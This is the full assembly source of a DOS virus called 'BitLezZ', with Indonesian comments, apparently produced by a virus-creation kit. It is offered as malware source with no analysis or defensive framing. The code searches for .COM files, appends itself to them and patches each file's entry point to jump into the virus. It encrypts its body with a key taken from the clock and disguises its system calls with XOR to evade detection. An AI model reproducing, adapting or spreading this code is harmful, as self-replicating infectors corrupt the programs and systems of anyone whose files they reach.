; Indonesian Virus Source Creator v0.1.1
; Written by Henry Yonathan
; Virus Name	: BitLezZ
; Author	: Ding Lik

	Ideal
	Model Tiny
	UDataSeg
	DTA		db 43 dup (?)	; Untuk DTA baru
	Label		Buffer	Byte
	CodeSeg
	Radix	16			; Gunakan bilangan hexa
	StartUpCode			; Atau Org 100

StartOfVirus:
	db 0e8, 0, 0			; Loncat ke SOV

SOV:
	pop bp
	call $ + 3			; Trik untuk memperoleh flexible offset
	pop bp				; BP = IP
	sub bp, offset $ - 1		; BP = BP - Ofset sebelumnya

	mov [Word bp + 11dh], 21cdh
	mov [Word bp + 11f], 20cdh

	mov ax, 2503
	xor dx, dx
	db 4 dup (90)

	lea ax, [bp + EnDecrypt]
	call ax				; Encrypt/Decrypt

WhereToEnDec:				; Awal yang di D/Encrypt
	db 0be, 0f0, 0ff
	mov di, 100
	push di
	push di
	mov cx, 3
	rep movsb
	lea si, [bp + Old3byte]		; Alamat 3 asli cadangan
	pop di
	movsw
	movsb				; Pindahkan
	mov ah, 1a
	lea dx, [bp + DTA]
	int 21				; Buat DTA baru

	mov ah, 4e xor 5
	lea dx, [bp + Victim]		; Pola file
	mov cx, 27
	xor ah, 5
	int 21				; Cari file!

	mov ax, 3d02 xor 7780
	xor ax, 7780
	lea dx, [bp + DTA + 1e]		; Nama korban
	int 21				; Buka
	xchg ax, bx			; BX = file handle

	mov ah, 3f - 0f
	mov cx, 3			; 3 byte
	lea dx, [bp + Buffer]		; Tempatkan pada Buffer
	add ah, 0f
	int 21				; Baca!

	lea si, [bp + Buffer]		; 3 byte asli
	lea di, [bp + Old3Byte]		; 3 byte asli cadangan

	movsw
	movsb				; Pindahkan

	mov cx, [word bp + DTA + 1a]	; CX = besar file
	sub cx, (EndOfVirus - SOV) + 3	; Kurangi dengan besar virus
	cmp [bp + Buffer], 0E8		; Byte pertama jmp ?
	jne Infeksi			; Tidak, Infeksi
	cmp [word bp + Buffer + 1], cx	; Bytes kedua = CX ?
	jne Infeksi			; Tidak, Infeksi

Selesai:
	mov ah, 3e - 7
	nop
	add ah, 7
	int 21				; Tutup file

	mov ah, 1a
	mov dx, 80
	int 21				; Kembalikan DTA

Return:
	ret				; Balik ke program asli

;// Virus' data
;//
Victim 		db '*.CoM', 0		; Pola file

Old3byte	db 90, 0CDh, 20		; 3 byte asli cadangan

Infeksi:
	mov ax, 4202 xor 7780
	cwd
	xor cx, cx
	xor ax, 7780
	int 21				; Ke akhir file

	mov ah, 2c
	int 21				; Dapatkan waktu
	or dx, dx			; DX = 0?
	jz $ - 6			; Ya, ambil waktu lagi
	mov [word bp + EnDecrypt + 9], dx	; DX = kode D/Encrypt

	lea si, [bp + SOV]		; SI alamat awal data
	lea di, [bp + Buffer + 3]	; DI = offset Buffer + 3
	push di
	mov cx, (EndOfVirus - SOV)
	rep movsb			; Salin!
	pop di
	sub di, bp
	add di, (WhereToEnDec - SOV)
	mov [bp + offset EnDecrypt + 2], di	; Rubah Alamat Enkripsi
	lea si, [byte bp + EnDecrypt + 8]	; SI = alamat SUB
	mov ax, [si]			; DI = kode SUB
	push ax				; Simpan
	xor [byte si], 28		; Rubah SUB -> ADD
	lea si, [bp + EnDecrypt]	; SI = Alamat D/Encrypt
	call si				; Panggil
	pop ax				; Kembalikan kode SUB
	mov [byte bp + EnDecrypt + 8], al	; Rubah ADD -> SUB

	mov ah, 40 xor 77
	xor ah, 77
	lea dx, [bp + Buffer + 3]	; Alamat data
	mov cx, (EndOfVirus - SOV)	; Banyaknya
	int 21				; Tulis!

	mov ax, 4200 xor 7780
	xor cx, cx
	cwd
	xor ax, 7780
	int 21				; Ke awal file

	mov ax, [word bp + DTA + 1a]	; AX = besar file
	sub ax, 3			; Kurangi 3
	mov [bp + Buffer], 0E8		; Byte pertama jmp
	mov [word bp + Buffer + 1], ax	; jmp sebesar file (AX)

	mov ah, 40 xor 77
	mov cx, 3			; Banyaknya
	xor ah, 77
	lea dx, [bp + Buffer]		; Alamat data
	int 21				; Tulis 3 byte baru

	jmp Selesai

EndEnDec:

Proc EnDecrypt

;;      IVSC 0.1.1 Simple Encryption Engine

	lea si, [bp + WhereToEnDec]
	mov cx, (EndEnDec - WhereToEnDec) / 2
	;sub [word si], 0000
	db 81, 2c, 00, 00
	inc si
	inc si
	dec cx
	jne $ - 7
	mov [Word bp + 11f], 9090
	mov [Word bp + 11dh], 9090
	ret
	endp

EndOfVirus = $

	END